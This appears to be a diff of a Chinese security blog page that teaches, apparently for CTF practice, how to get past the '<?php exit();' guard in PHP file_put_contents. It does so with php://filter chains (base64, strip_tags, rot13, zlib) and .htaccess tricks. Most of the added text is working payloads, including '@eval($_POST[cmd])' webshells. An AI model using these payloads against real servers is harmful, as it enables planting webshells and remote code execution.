+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;php://filter/string.strip_tags|convert.base64-decode/resource=s1mple.php&#x27;</span></span><br><span class="line"><span class="variable">$content</span>=<span class="string">&#x27;?&gt;PD9waHAgcGhwaW5mbygpOz8+&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是php7的话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test1.php?filename=</span><br><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=adam.php&amp;content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?%3E%3C?php%0d@eval($_POST[cmd]);?%3E/resource=adam.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=adam.php&#x27;;</span><br><span class="line">$content=&#x27;php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0d@eval($_POST[cmd]);?&gt;/resource=adam.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>先压缩，然后小写，然后解压缩，<strong>不过可能这是个特殊情况</strong></p>
+<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_fontents</span>(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>这里使用base64会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></pre></td></tr></table></figure>
+
+<p><code>=</code>在base64中的作用是填充，在<code>=</code>的后面是不允许有任何其他字符的否则会报错，有的解码程序会自动忽略后面的字符从而正常解码，其实实际上还是有问题的。</p>
+<p>所以需要想办法去掉<code>=</code></p>
+<h3 id="去掉等号之过滤器嵌套base64"><a href="#去掉等号之过滤器嵌套base64" class="headerlink" title="去掉等号之过滤器嵌套base64"></a>去掉等号之过滤器嵌套base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip.tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</span><br></pre></td></tr></table></figure>
+
+<p>可以生成文件，但是访问不到，这是因为引号的问题，可以使用伪目录的方法绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="去掉等号之直接对内容进行变性另类base64"><a href="#去掉等号之直接对内容进行变性另类base64" class="headerlink" title="去掉等号之直接对内容进行变性另类base64"></a>去掉等号之直接对内容进行变性另类base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</span><br></pre></td></tr></table></figure>
+
+<p>这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘&#x3D;’这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后base64-decode再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果；这是两种攻击思路；</p>
+<h3 id="rot13"><a href="#rot13" class="headerlink" title="rot13"></a>rot13</h3><p>和第一种类型一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=s1mple.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="第三种情况"><a href="#第三种情况" class="headerlink" title="第三种情况"></a>第三种情况</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,$content . &quot;\nxxxxxx&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这种情形一般考点都是禁止有特殊起始符和结束符号的语言</p>
+<p>举个例子，如果题目没有ban掉php，那么我们可以轻而易举的写入php代码，因为php代码有特殊的起始符和结束符，所以后面的杂糅代码，并不会对其产生什么影响</p>
+<p>常见的考点是利用<code>.htaccess</code>进行操作，<code>.htaccess</code>文件对其文件内容的格式很敏感，如果有杂糅的字符，就会出现错误，导致我们无法进行操作，所以这里我们必须采用注释符将杂糅的代码进行注释，然后才可以正常访问</p>
+<h2 id="strip-tags绕过"><a href="#strip-tags绕过" class="headerlink" title="strip_tags绕过"></a>strip_tags绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit; ?&gt;实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</span><br></pre></td></tr></table></figure>
+
+<p>但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</p>
+<p>注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+
+
 
     </div>
 
@@ -383,13 +516,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">89k</span>
+    <span title="站点总字数">96k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:21</span>
+    <span title="站点阅读时长">1:28</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
